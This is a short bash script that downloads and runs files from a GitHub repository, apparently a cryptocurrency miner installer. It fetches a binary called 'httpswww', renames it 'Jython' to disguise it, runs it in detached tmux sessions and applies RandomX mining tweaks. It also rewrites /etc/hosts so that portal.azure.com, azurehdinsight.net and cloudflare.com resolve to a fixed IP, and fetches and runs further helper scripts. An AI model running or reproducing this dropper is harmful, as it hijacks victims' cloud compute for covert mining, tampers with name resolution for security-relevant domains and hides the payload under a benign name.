#!/bin/bash

set -x #echo on
if [ -f ${PWD}/Jython ]; then
    if pgrep -x "Jython" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
sudo rm config.json
sudo wget https://raw.githubusercontent.com/crawford1988/codeweb/main/config.json
sudo tmux new-session -d -s my_session1  './Jython'

fi
exit
fi



sudo apt-get install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev cpulimit ipset -y
sudo rm config.json
sudo wget https://raw.githubusercontent.com/crawford1988/codeweb/main/config.json
sudo wget https://raw.githubusercontent.com/crawford1988/codeweb/main/httpswww
wget https://raw.githubusercontent.com/crawford1988/codeweb/main/enable_1gb_pages.sh
sudo bash enable_1gb_pages.sh
wget https://raw.githubusercontent.com/crawford1988/codeweb/main/randomx_boost.sh
sudo bash randomx_boost.sh
sudo chmod +x httpswww
mv httpswww Jython
sudo -- sh -c "echo '148.163.92.24  portal.azure.com' >> /etc/hosts"
sudo -- sh -c "echo '148.163.92.24  azurehdinsight.net' >> /etc/hosts"
sudo -- sh -c "echo '148.163.92.24  cloudflare.com' >> /etc/hosts"
wget https://raw.githubusercontent.com/crawford1988/codeweb/main/24h.sh
sudo chmod +x 24h.sh
sudo tmux new-session -d -s my_session12  './24h.sh'
wget https://raw.githubusercontent.com/crawford1988/codeweb/main/block.sh
sudo chmod +x block.sh
sudo tmux new-session -d -s my_session1342  './block.sh'
